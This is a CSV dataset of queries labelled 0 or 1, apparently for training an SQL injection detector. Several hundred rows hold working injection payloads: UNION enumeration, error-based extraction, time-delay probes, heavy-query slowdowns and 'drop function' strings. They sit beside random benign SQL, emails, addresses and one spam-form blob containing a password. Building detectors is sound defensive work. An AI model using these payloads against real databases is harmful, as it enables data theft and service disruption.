Query,Label
SELECT * FROM recall WHERE motor = 'officer' FETCH FIRST 3 ROWS ONLY,0
SELECT very ( s )  FROM dark LEFT JOIN,0
"1  )   union all select null,null,null,null,null,null,null,null,null--",1
lloyd-pack-partain@elalamorestaurante.ir,0
doriot,0
if  (  8182  =  3225  )   select 8182 else drop function kpzk--,1
"c/ la paloma, 32 12-a",0
"1  )   as rtpl where 1262  =  1262 and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",1
"1%""   )    )     )   and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (     (  ""%""  =  """,1
"  SELECT correctly,relationship,bus FROM throat LEFT JOIN Orders ON skill.chapterID =  minerals.cast ORDER BY police.women",0
" select * from users where id  =  1 or 1#""? union select 1,version  (    )   -- 1",1
SELECT VERSION (  ) ;,0
SELECT * FROM nearly FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM fully,0
"1""  )   as xylo where 2112  =  2112 and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --",1
or 1  =  1--,1
calle jose lopez tafall 192,0
SELECT writer ( s )  FROM entire SELECT thirty ( s ) ,0
"1%""   )    )     )   and 2006  =  2006",1
SELECT * FROM frighten WHERE NOT figure = 'list'  AND NOT apart = 'heavy',0
9.12244E+15,0
SELECT * FROM dirt WHERE steel  BETWEEN 10 AND 20,0
"1 and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  ",1
 and 1 in   (  select var from temp  )  --,1
"-8382""   )    )    order by 1--",1
" SELECT * FROM finish ORDER BY cow, sound",0
SELECT * FROM raw  WHERE glass = sentence,0
"1%"" and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1
"-2434  )   union all select 8310,8310,8310,8310,8310--",1
" select * from users where id  =  1. <@ union select version  (    )  ,version  (    )   -- 1",1
SELECT COUNT ( slept ) FROM visit,0
"etorbidea nafarroa behereko, 162 6?d",0
"-8982' in boolean mode  )   union all select 5367,5367,5367,5367,5367,5367#",1
1' where 1844  =  1844,1
SELECT MIN ( among )  AS worker FROM pool,0
"  SELECT equal,southern,trouble FROM hurry LEFT JOIN Orders ON fell.floorID =  headed.dust ORDER BY rope.heat",0
SELECT * FROM film FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM leather,0
SELECT AVG ( as )  FROM hurt  SELECT SUM ( poor ) ,0
31414,0
poncin@todobetis.mil,0
"c/ torre, 151, 9?b",0
"   SELECT colony, tonight+ ', ' + effect+ ' ' + almost+ ', ' + salt AS led  FROM most",0
SELECT TOP 50 PERCENT * FROM previous SELECT * FROM sale FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM judge,0
"SELECT * FROM change WHERE as BETWEEN ""straw"" AND    ""two""",0
SELECT * FROM ago  WHERE noon = blank,0
-4557 or 6872  =  6872-- kkte,1
"SELECT * FROM between WHERE immediately BETWEEN ""vapor"" AND    ""national""",0
SELECT * FROM alike WHERE science = 'made'  OR zero = 'football',0
select   (  case when   (  2056  =  1917  )   then 2056 else 1/  (  select 0  )   end  )  --,1
grea,0
"1  )   as kzyb where 7023  =  7023 and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1
SELECT Count ( * )  AS knew,0
80876345l,0
" select * from users where id  =  '1'   union select null,banner from v$version where rownum  =  1 -- 1'",1
46510,0
SELECT option_value FROM wp_options WHERE option_name  =  '_houzez_property_status_3142' LIMIT 1,0
SELECT TOP 50 PERCENT * FROM college SELECT * FROM alone FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM jet,0
siku@tartasconamor.in,0
SELECT option_value FROM wp_options WHERE option_name  =  '_houzez_property_status_3140' LIMIT 1,0
SELECT AVG ( dust ) FROM dot,0
"-7940%""  )   union all select 2779,2779,2779,2779,2779,2779,2779,2779,2779,2779#",1
"1%'   )    )    union all select null,null,null,null,null--",1
"  SELECT shotID AS ID, same AS fuel FROM finger",0
2.03996E+15,0
SELECT pine ( s )  FROM minerals SELECT library ( s ) ,0
SELECT * FROM needs WHERE here = 'deer'  OR situation = 'donkey',0
cortada mercader,0
" SELECT * FROM public ORDER BY rising ASC, foot DESC",0
joudrey,0
"-5131'   )    )     )   union all select 4854,4854,4854,4854,4854,4854,4854#",1
or isNULL  (  1/0  )   /*,1
vada,0
cutler.hutton@the-white-pearl-resort.int,0
"1%""   )    )     )   union all select null,null,null,null,null,null,null,null,null,null--",1
"  SELECT wentID AS ID, again AS lose FROM pair",0
"1'+  (  select 'jfir' where 7814  =  7814 and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )      )    )   +'",1
chapurrar,0
"calle valle de salazar, 48,",0
1'+  (  select qtyi where 7147  =  7147,1
"1""  )   as jmwr where 5978  =  5978 rlike   (  select   (  case when   (  1396  =  8762  )   then 1 else 0x28 end   )    )   --",1
SELECT trade ( s )  FROM official UNION ALL,0
3.19291E+15,0
"-3954'   )    )    union all select 2417,2417--",1
SELECT TOP 3 * FROM least WHERE cook = 'wolf',0
SELECT * FROM weather WHERE NOT stay = 'just'  AND NOT concerned = 'respect',0
50332,0
SELECT TOP 50 PERCENT * FROM perfect,0
SELECT AVG ( wherever ) FROM entirely SELECT SUM ( call ) ,0
"1' and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",1
querbico,0
"-9119""  )   where 9237  =  9237 or 8571  =  8571--",1
lewes,0
SELECT * FROM tears FETCH FIRST 50 PERCENT ROWS ONLY,0
SELECT AVG ( outline ) FROM garage,0
SELECT AVG ( loud )  FROM chance  SELECT SUM ( mice ) ,0
1'  )   where 7252  =  7252,1
"1"" and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and ""fqeu"" like ""fqeu",1
SELECT music ( s )  FROM garden LEFT JOIN,0
choclo,0
d0s9pi2car,0
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 4069 )  ORDER BY meta_id ASC",0
SELECT private ( s )  FROM wing LEFT JOIN,0
"1'||  (  select 'zrea' from dual where 1223  =  1223 or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",1
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 28620 )  ORDER BY meta_id ASC",0
SELECT end FROM funny,0
"1 where 7362  =  7362 and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",1
"-3667%'   )    )    union all select 3560,3560,3560--",1
"-6419 union all select 7008,7008,7008,7008,7008--",1
"1'||  (  select 'vekn' from dual where 4929  =  4929 and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5   )    )   ||'",1
SELECT * FROM rapidly WHERE fairly NOT LIKE 'stairs%',0
1'||  (  select 'npdx' from dual where 9486  =  9486 and sleep  (  5   )    )   ||',1
-6036   )    )     )   or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and    (    (     (  6723  =  6723,1
"admin""  )   or   (  ""1""  =  ""1""/*",1
" SELECT * FROM fruit ORDER BY action, fear",0
pente@maxitienda.ms,0
"1""   )    )     )   and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and    (    (     (  ""djrh""  =  ""djrh",1
" select * from users where id  =  1 or ""  )  {"" or 1  =  1 -- 1",1
SELECT * FROM beyond WHERE east = 'desk'  OR wear = 'biggest',0
SELECT passage FROM wooden,0
"1%""  )   union all select null#",1
garek,0
"-3063%""   )    )     )   or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and    (    (     (  ""%""  =  """,1
SELECT TOP 3 * FROM several WHERE stomach = 'letter' SELECT * FROM any,0
SELECT * FROM square FETCH FIRST 50 PERCENT ROWS ONLY,0
select   (  case when   (  1499  =  4923  )   then 1499 else 1/  (  select 0  )   end  )  --,1
SELECT creature ( s )  FROM where UNION ALL,0
SELECT * FROM discussion WHERE brass = 'stage'  AND  ( plural = 'men' OR gray = 'purple' ) ,0
"-7796'  )   union all select 4960,4960,4960,4960,4960,4960,4960,4960,4960,4960#",1
SELECT AVG ( Price ) FROM fair,0
45643261z,0
"1,  (  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  7823  =  7823  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric   )    )   ",1
salv sagra,0
SELECT * FROM win WHERE potatoes BETWEEN 'research' AND 'hospital',0
vadim,0
"  SELECT Orders.keyrID, Employees.smile, Employees.managed FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID  =  Employees.bridgeID ORDER BY Orders.airplaneID",0
enco,0
"de]]>  </email_address>   <find_account_answer>  <![CDATA[fqaepqdkct]]>  </find_account_answer>   <find_account_question>  <![CDATA[6]]>  </find_account_question>   <homepage>  <![CDATA[]]>  </homepage>   <is_secret>  <![CDATA[]]>  </is_secret>   <methodCall>   <mid>  <![CDATA[qna]]>  </mid>   <module>  <![CDATA[member]]>  </module>   <nick_name>  <![CDATA[ElwoodBuckley041104]]>  </nick_name>   <params>   <password2>  <![CDATA[Yxg6dsF5iU]]>  </password2>   <password>  <![CDATA[Yxg6dsF5iU]]>  </password>   <reward_point>  <![CDATA[0]]>  </reward_point>   <title>  <![CDATA[Ways To Make Cash Online - Make Money From Home]]>  </title>   <user_id>  <![CDATA[ElwoodBuckley041104]]>  </user_id>   <user_name>  <![CDATA[ElwoodBuckley041104]]>  </user_name>    =    =     =    =  01 @7520 A3B10 A3B12C41 A3B12C411 APP AR-203 ASCd AgAHMzM3MsdfjMwMExG6Pvz1i3DhGd7DSt5Ve9Qu/n91BdfdEB5EbdeO/M5lphLOo5yOn/ZyS1jabRmzu2WUHoScLEwJjaDz2yHm9tJWbLuELC/JM8Eix/VtyWmMO5osa8FbYZnPanAxI7Ty0n7avQytu2rEK2F+N+C390zLVThtSXL1Isk49OSEWuEAzdaRlmLUWcpx6XSDjFZ++1cgwEoAILJ9Q5NObm6nYipbGovJ6YZgiEncnT9GU6x6sgKNppX0YgXXmss+0Qi5eXWmDn30UlwjfTbmc+Ta17XLDXGm6f/hiM7f4fde+5c+Pavn9EIZXYe9K6G/GyCM7I0dzjPIsjEOwl96y+fYXoZoJcp79kLwtTy6F1dL1HAs8DSFoIrfoUs7zyFtzgMnV2K0sT68IwWkiof2eM1Xes5nbDzmHOEQZ+loGLF2UBIyGcz4cSCtdZhrJXt7TxSIzeHKYpCgtVhNo4zJDlHo7zpUnR+8dSlUsdf18e08zs4iGMRK43bhv6oGA6dUw/dX+exrGTL+NMOThQUQvFdYNsc+AFGWo3PqLFhjQ9s3RzK5krr6II3e2vKhs36q7NgNgaIlQNiqNo8cNbE8iVUxZcHhvxaOStpiUN+N9KY4sZ51Ole8offosPb1NqXs3575SXU+1dEpaggUrUJqKjeUM4Hu90KoHmbL2+/zt6Bk+GCnk2WBKJENscEetfLBCBzBGXPlKC7/G5W4k8Gviynn4qCUoD9FvagtKTTF4MaA5rZtrKRabUae++259WRUZ3VEHfzjpXLaogS9DoeVHDebAClkkuAdU6F6fa2wFIM58  =   AgAHMzM3MjMwMJnS2WotX5wisoSRNiccx9VSfDnC/TFaDo/9wddE55SqhLOo5yOn/ZyS1jabRmzu2WUHoScLEwJjDz2yHsm9tJWa4Oyj22HdAIrJSshxe0KmKTxD4lBsReQqG6IN3ULz8oaEwMT7lKcx4Ukfep1IwCe7xHXlsW2gCFxdZmh731jKLuFDn/9rcY4AkdgqajLoHmVnLk3uBcTxbQS8XWJJk8++VnGu9toYSualxl0CgjSRgl01ddYqiaVYQOBShAcHCdfbHmbDZIPrPowSVFUAGpYsVDx3fVEdDa8NKRAPMI3wAlq40FqZDdhNXNr70OL9ZRzS82kWdHP8w2hd1KcIheAxDSw4a5FLAjzSWrdjcOvUfJQO5QT/90J19i2IWnuTNIdTzOcf3uVy23sHyWmsBEWHyaSsKDm7dfOPPwHIWamQKkdcm5KoWp/FgoIR09S0cn/BZzLOsdcFSbhYOxA  =    =   B_qna B_solution Bn2GepSdoAsdfe4V4a1@V$K@Bn2GepSdoAe4V4a1@23V$K@PlVEBnTVHAYa01hH@V$K@eTZyMZ0F3YBl4Ozr@V$K@Bn2GepSdoAe4V4a1@V$K@xJ8t+K+x1e6/nqCp@V$a1K@PLnd8fSYoXD3QL3s Board00001 C CYsdfSL7J/aXGaV/30TU412JWfjHA  =    =   Cont Content-Disposi Content-Disposition: form- Content-Disposition: form-data; name  =  ""app"" Content-Disposition: form-data; name  =  ""cd_loan_type"" Content-Disposition: form-data; name  =  ""id_finance"" Content-Disposition: form-data; name  =  ""mode"" Content-Disposition: form-data; name  =  ""no"" Content-Disposition: form-data; name  =  ""no_goods"" Content-Disposition: form-data; name  =  ""path"" Content-Disposition: form-data; name  =  ""pnm"" Content-Disposition: form-data; name  =  ""return_page"" Content-Disposition: form-data; name  =  ""type"" D2 D3 DC-3000 DF Del E EA F1 F4 F5 F6 FG123P8HQ+vasd0pVzD2O+YlD+v1V2g  =    =   FmsdfVDvlXqIVetUIzs@V$K@Vj+fqZ6TuN123pq1X2w@V$K@dqRLntgax88tXGB3@V$K@R43SsinxoXFCKjAy FmVDvlXqIVetUIzs@V$K@n5aESvV0q4Se1iBn8@Vasd$K@M5IvfWDvvs5y1TnouS@V$K@Vj+fqZ6TuNpq1X2w@V$K@fuvKbfOrsGKtsDsdf7l@V$K@ZtgfO1WcVPD67KFos@V$K@dqRLntgax88tXGB3 Free Fun Hf6DNiDdq1xzaB3bdDT@V$512K@MRn61gAqhi0iae213dd@V$K@Hf6DNisdfDxzaB3bdDT@V$K@rSTgzjcYIY7Iirl+@V$K@iTI/NtJsfFTdH8ah@V$K@Hf6DNiDxzaB3bdDT@V$K@EdodGNxPNEYWbWcs JVwH/8xSq6ezJPYt@V$s23K@vPr4I41U8oeym0BEi+@V$K@3WPcTx1mJ5sBdACl@V$K@3WPcTx1mJ5sBdACl@V$K@QpmadUUMPKv2tSJP@V$K@JVwH/8xSq6ezasdfJPYt@V$K@vPr4IU8oeym0BEi+ L-840 360ml 트리거 L-840 450 트리거 L5VSRxv4dfoDXwH+hZ@V$K@T0NO9ASwF7J4gKAh@V$K@VWvmclMqqannOAJf@V$K@ERQVjx2OGeE0Mxdf@V$K@VicBva15FL1xm0WH@Va123$K@T0NO9ASwF7J4gKAh@V$K@VicBva15FL1xm0WH PSC-1 NPP Purchase omnicef without prescri QJt5lWbasdftpJ3yciKW@V$K@Hf6DNi123Dxz1aB3bdDT@V$K@iTI/NtJsfFaTdH8vah@V$K@MRn61gAqhi0iaedd QNA_7 R RandD S SF-1013 SR-600 School TC-100 TP1 TracyJat TzwvXJPEcaaOZ9DhJ0@V$K@6DPV+YkQBHbJYSMo@V$Kw@fykXPjdnQQrXTvasdfSr@V$K@c1LOcyiCkFas+XHzbo@V$K@LIHG/+VLgv8RRGR01123@V$K@TzwvXJPEcOZ9DhJ0@V$K@uiGFBm0312rIUaiuBxk UWxvAe743xrPY10JM@V$K@rojWCf7y+OXORcBK@V$Kv@0AIa2oYla5Nt1ckw3@V$K@GMPMso40NCSoArEA V V0hYD71LOy24uhiN4N@3V$K@L5VSRxv4oDXwH+hZ@Vsdf$K@znwrm3vjnUyJBkle@V$K@OuJAnfBzCHbLSge1 VISITVIEW WJyyJ+94QQ2bZbMjn@V$K@kyzIU123+92FxfeBsdfaTn@V$K@3GcBPScFJ6QQEw12gn@V$K@kyzIU+92FsdxfeBaTn@V$K@kNefOsew6E+LZCD51r@V$K@WJyyJ+94Q4asdfkQbZbMjn@V123$K@WJyyJ+94QQbZbMjn WlDxZ/Xl9Gqymv123SWnoZdkHQ  =    =   WnuIfx55kZ XQg12SK2QaeLWOadsfsa124yeMxePT1Pg  =    =   Y Y&check_name Y,Y,Y,Y,Y,Y,Y,Y,Y,Y,Y,Y Y29k123ZT1mcmVlJnNlYXJjaasdvFa9pdGVtPSZzZWFyY2hfb3JkZXI9JnVuc2luZ2NvZGUxPTEyNTc3NTU2OTEkljoimdW5zasadfW5nY29kZTI9MTI1Nzc1NTc4123OCZ1asdfbnNpbmdjb232Rl41Mz0mY2F0ZT0mcHdkPQ  =    =  || Y29kZTasdf1xbmEmc2VcwehcmNoX2l0ZW09JnNlYXJjaF9vcmRlcasdj0mdW5zaW5nY29kZTE9MTIc131Nzc1NTY5MSZ1bnNpbmdjb2RlMj0xMjU3NzU1NzczJnVuc2412sasdfqluZ2NvasdfpwZGUzPSZjYXRlPSZwd2Q9|| YM YYkswPo6JL4ZZMkx@V$K@JnrdZp35dfasbHSPasldfp1123x571@V$K@7QbUi7a/9aCtxupAas;ldf@V$K@7QbUi7a/9aCtxupA@V$Ks;dlfsalkl;k@jW4BJJFvS0sJfNr9@V$K@YYkswPo6JL4ZZMkx@V$asdlkfjK@cM7J0WfRkiELyEje YcrJWg5O Yfrhmym9asdfkHyKybz9y@V$K@7asdlfksaldfXRKgdViFaBwTq7N@V$K@Yfrhmym9HyasldfkpoKybz9y@V$K@ZIKXXH1fCD3qlt7L add again_loan_Mobile agree_10_1 agree_20_1 agree_20_2 agree_30_1 agree_30_2 agree_30_3 agree_30_4 agree_40_1 agree_40_2 and1 ap14 application apply2 checkPwd",0
SELECT * FROM  ( SELECT slide FROM shout ) ,0
2.82171E+15,0
"-4869%' union all select 5729,5729,5729--",1
"1   )    )     )   and char  (  109  )  ||char  (  79  )  ||char  (  70  )  ||char  (  90  )    =  regexp_substring  (  repeat  (  right  (  char  (  5012  )  ,0  )  ,5000000000  )  ,null  )  --",1
jorge paquirachi,0
t!74ador,0
08zaril0o,0
2.14581E+15,0
SELECT out ( s )  FROM afternoon,0
harlin,0
SELECT atmosphere ( s FROM thread RIGHT JOIN,0
pascual,0
SELECT * FROM poetry 3 SELECT * FROM indicate,0
charley,0
SELECT COUNT ( DISTINCT sound )  FROM serious,0
"INSERT INTO refused  ( angry, from, rhyme )  VALUES  ( 'fly', 'chicken', 'team' )  ",0
1  )   where 3381  =  3381 and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )  --,1
"INSERT INTO tall ( oxygen, coach, term, discussion, lake, fall )  VALUES  ( 'married', 'comfortable'. surprise', 'summer', 'tune', 'suppose', 'skill' )  ",0
SELECT * FROM beginning WHERE many = 'wheat'  AND City = 'goose',0
"   SELECT late, properly, furniture FROM travel WHERE fort  IS NULL",0
"1 or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  # cqqs",1
"1 where 7196  =  7196 or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )   --",1
SELECT * FROM birthday 3 SELECT * FROM impossible,0
SELECT * FROM  ( SELECT someone FROM nor ) ,0
"1   )    )     )   or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",1
magrans ribes,0
"1' where 3125  =  3125   (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users  )  --",1
"c/ venecia, s/n,",0
abietceo,0
askam@maxtienda.er,0
"1   )    )     )   or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (     (  8814  =  8814",1
"select count  (  *  )   from generate_series  (  1,5000000  )   and    (    (   7240  =  7240",1
1 where 6365  =  6365,1
SELECT * FROM reason WHERE again = 'string',0
SELECT MIN ( here )  AS desk FROM toward,0
-6165%'   )    )    union all select 5384#,1
retallac,0
"glorieta valle de oro, 9 10a",0
"1 or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   # jmki",1
SELECT COUNT ( factorID ) FROM gold,0
SELECT TOP 50 PERCENT * FROM choice,0
arcediano,0
"1'||  (  select 'vqag' from dual where 8154  =  8154 union all select null,null,null,null,null,null,null,null,null,null--",1
chuchazo,0
"-6733'  )   where 4024  =  4024 union all select 4024,4024,4024,4024#",1
" select * from users where id  =  1 union select @&&@,version  (    )   -- 1",1
SELECT TOP 50 PERCENT * FROM sometime SELECT * FROM herd FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM log,0
" SELECT * FROM something ORDER BY weak ASC, sugar DESC",0
"SELECT * FROM of WHERE family BETWEEN ""boat"" AND    ""boat""",0
select   (  case when   (  2576  =  7563  )   then 2576 else 1/  (  select 0  )   end  )  --,1
1' or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and 'hokd'  =  'hokd,1
SELECT * FROM clear WHERE Price NOT BETWEEN 10 AND 20,0
34239,0
SELECT space FROM garden,0
SELECT * FROM upper WHERE mainly BETWEEN 'these' AND 'clay',0
SELECT wing ( s FROM satisfied RIGHT JOIN,0
"select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and    (    (   'rkoe'  =  'rkoe",1
"1'||  (  select 'oxam' from dual where 7162  =  7162 and make_set  (  8403  =  8403,8899   )    )   ||'",1
1%'   )    )     )   and 7219  =  7361 and    (    (     (  '%'  =  ',1
"1""   )    )    and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #",1
SELECT * FROM metal FETCH FIRST 3 ROWS ONLY,0
"  SELECT perhaps,point FROM syllable WHERE sleep = 'dog' UNION SELECT anywhere, you FROM grandfather",0
"-6335""   )    )     )   union all select 3654--",1
SELECT * FROM tin WHERE before BETWEEN general09/01/1996poor AND practice15/31/1996that,0
"1'  )   and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and   (  'rgue' like 'rgue",1
"-9180"" or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",1
DELETE FROM physical,0
1.45569E+15,0
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 11524 )  ORDER BY meta_id ASC",0
1.97346E+15,0
SELECT * FROM speech,0
1'  )   or sleep  (  5  )   and   (  'mdmr' like 'mdmr,1
"-3090"" or make_set  (  9354  =  9354,7185  )   and ""qowe"" like ""qowe",1
"SELECT * FROM met WHERE entire BETWEEN ""tears"" AND    ""act""",0
 (  select   (  case when   (  9337  =  9337  )   then waitfor delay '0:0:5' else 9337*  (  select 9337 from master..sysdatabases  )   end   )    ) ,1
1'  )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )   and   (  'brob'  =  'brob,1
SELECT COUNT ( stringID ) FROM journey,0
SELECT every FROM directly UNION ALL SELECT merely FROM indeed ORDER BY furniture,0
capaz9,0
"-1678"" where 3706  =  3706 or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  --",1
"-9810'  )   where 4361  =  4361 or elt  (  1032  =  1032,3623  )  --",1
"  SELECT taken,satisfied FROM this WHERE teach = 'dear' UNION SELECT jar, step FROM scene",0
"-5771'   )    )    union all select 2833,2833,2833,2833,2833,2833--",1
reencar!nacin,0
1%'  )   waitfor delay '0:0:5'--,1
SELECT * FROM art ORDER BY perfectly,0
SELECT week ( s )  FROM outside SELECT pot FROM during,0
"1"" where 6501  =  6501",1
-5089'   )    )    as icbb where 1129  =  1129 or 6250  =  9650,1
"1'+  (  select hspl where 4530  =  4530 and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1
"  SELECT SUBTIME ( ""2017-06-15 10:24:21.000004"", ""3:2:5.000001"" ) ;",0
"-3729'   )    )    or elt  (  4482  =  2648,2648  )   and    (    (   'vkkr' like 'vkkr",1
if  (  2643  =  1393  )   select 2643 else drop function nqss--,1
select * from users where id  =  '1' + $+%$ or 1  =  1 -- 1',1
"-7511   )    )    as xqzf where 9939  =  9939 union all select 9939,9939,9939,9939,9939,9939,9939--",1
6e1ba,0
SELECT COUNT ( languageID ) FROM church,0
-4803%'   )    )    or 8571  =  8571--,1
1' where 6409  =  6409,1
SELECT * FROM yes WHERE certainly IN  ( SELECT heard FROM track ) ,0
raimondo,0
"1%'   )    )    or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (   '%'  =  '",1
dottin,0
SELECT * FROM grade  WHERE world = beginning,0
"1 or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  -- dpph",1
2u27lad9r4,0
gall20o,0
SELECT * FROM force,0
3.4285E+15,0
61621455q,0
-3752%' union all select 9351--,1
SELECT * FROM with WHERE loose = 'have' FETCH FIRST 3 ROWS ONLY,0
â or 1  =  1 --,1
SELECT TOP 50 PERCENT * FROM wind,0
